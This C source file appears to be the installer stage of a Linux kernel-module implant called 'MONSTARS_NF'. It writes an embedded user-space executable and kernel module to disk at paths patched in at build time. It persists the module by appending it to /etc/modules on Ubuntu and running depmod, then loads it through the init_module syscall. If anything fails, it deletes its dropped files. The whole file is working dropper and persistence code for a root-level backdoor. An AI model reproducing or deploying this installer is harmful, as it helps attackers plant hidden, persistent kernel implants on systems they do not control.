#include <errno.h>
#include <libgen.h>
#include <linux/module.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "macros.h"

// *** magic values to stamp over ***
static const char c_user_exe_path[255] = "BASKETBALLJONES";
static const char c_kernel_mod_path[255] = "MORONMOUNTAIN";

//
// check for /proc/task (ko already inserted)
//
int check_proc_task()
{
    int retval = 0;

    FILE *task = fopen("/proc/task", "r");
    if (NULL != task)
    {
        fclose(task);
        DEBUG_LOG("/proc/task already exists!\n");
        retval = -1;
    }

    return retval;
}

//
// drop the user exe to disk
//
int drop_user_exe()
{
    int retval = -1;
    FILE *user_exe = fopen(c_user_exe_path, "w");
    if (NULL != user_exe)
    {
        if (sizeof(c_UserExe) == fwrite((void *)c_UserExe, sizeof(char), sizeof(c_UserExe), user_exe))
        {
            if (0 == chmod(c_user_exe_path, S_IRWXU))
            {
                DEBUG_LOG("Dropped user exe: %s\n", c_user_exe_path);
                retval = 0;
            }
            else
            {
                DEBUG_LOG("Could not chmod u+x on user exe (errno: %d)\n", errno);
            }
        }
        else
        {
            DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", c_user_exe_path, errno);
        }
        fclose(user_exe);
    }
    else
    {
        DEBUG_LOG("Could not open %s (errno: %d)\n", c_user_exe_path, errno);
    }

    return retval;
}

//
// drop the kernel module to disk
//
int drop_kernel_mod()
{
    int retval = -1;
    FILE *ko = fopen(c_kernel_mod_path, "w");
    if (NULL != ko)
    {
        if (sizeof(c_KernelMod) == fwrite((void *)c_KernelMod, sizeof(char), sizeof(c_KernelMod), ko))
        {
            DEBUG_LOG("Dropped kernel module: %s\n", c_kernel_mod_path);
            retval = 0;
        }
        else
        {
            DEBUG_LOG("Could not write ko to %s (errno: %d)\n", c_kernel_mod_path, errno);
        }
        fclose(ko);
    }
    else
    {
        DEBUG_LOG("Could not open %s (errno: %d)\n", c_kernel_mod_path, errno);
    }

    return retval;
}

//
// set up the kernel module to be inserted on boot
//
int persist_kernel_mod()
{
    int retval = -1;
    char *ko_basename = NULL;
    char ko_name[50] = {0};
    FILE *os_release = NULL;
    char os_buf[128] = {0};
    size_t read = 0;
    int depmod_ret = 0;

    // parse the object name from the file path
    ko_basename = basename((char*)c_kernel_mod_path);
    if (NULL == ko_basename)
    {
        DEBUG_LOG("Could not split ko filename (errno: %d)\n", errno);
        goto exit;
    }
    if (1 != sscanf(ko_basename, "%[^.].ko", ko_name))
    {
        DEBUG_LOG("Could not parse ko name (errno: %d)\n", errno);
        goto exit;
    }

    // determine which distro flavor we're on
    os_release = fopen("/etc/os-release", "r");
    if (NULL == os_release)
    {
        DEBUG_LOG("Could not open /etc/os-release (errno: %d)\n", errno);
        goto exit;
    }
    read = fread(os_buf, sizeof(char), sizeof(os_buf), os_release);
    fclose(os_release);
    if (sizeof(os_buf) != read)
    {
        DEBUG_LOG("Could not read /etc/os-release (errno: %d)\n", errno);
        goto exit;
    }

    // Ubuntu: add entry to /etc/modules
    if (NULL != strstr(os_buf, "Ubuntu"))
    {
        FILE *modules = fopen("/etc/modules", "a");
        if (NULL != modules)
        {
            char ko_mod_entry[52] = {0};
            size_t written = 0;

            snprintf(ko_mod_entry, sizeof(ko_mod_entry), "\n%s", ko_name);
            written = fwrite((void *)ko_mod_entry, sizeof(char), strlen(ko_mod_entry), modules);
            fclose(modules);

            if (strlen(ko_mod_entry) == written)
            {
                depmod_ret = system("depmod");  // update the kernel module database
                if (0 == depmod_ret)
                {
                    DEBUG_LOG("Added %s to /etc/modules\n", ko_name);
                    retval = 0;
                }
                else
                {
                    DEBUG_LOG("depmod returned: %d\n", depmod_ret);
                }
            }
            else
            {
                DEBUG_LOG("Could not create /etc/modules entry (errno: %d)\n", errno);
            }
        }
        else
        {
            DEBUG_LOG("Could not open /etc/modules (errno: %d)\n", errno);
        }
    }
    // TODO: else if CentOS, possibly OpenSUSE
    else
    {
        DEBUG_LOG("Could not determine linux distro flavor!\n");
    }

exit:
    return retval;
}

int main()
{
    int retval = -1;

    if (0 == check_proc_task())
    {
        if (0 == drop_user_exe())
        {
            if (0 == drop_kernel_mod())
            {
                if (0 == persist_kernel_mod())
                {
                    if (0 == syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
                    {
                        DEBUG_LOG("MONSTARS_NF installed!\n");
                        retval = 0;
                    }
                    else
                    {
                        DEBUG_LOG("Failed to insert MONSTARS_NF module (errno: %d)\n", errno);
                    }
                }
            }
        }
    }

    // cleanup in error cases
    if (0 != retval)
    {
        unlink(c_kernel_mod_path);
        unlink(c_user_exe_path);
    }

    return retval;
}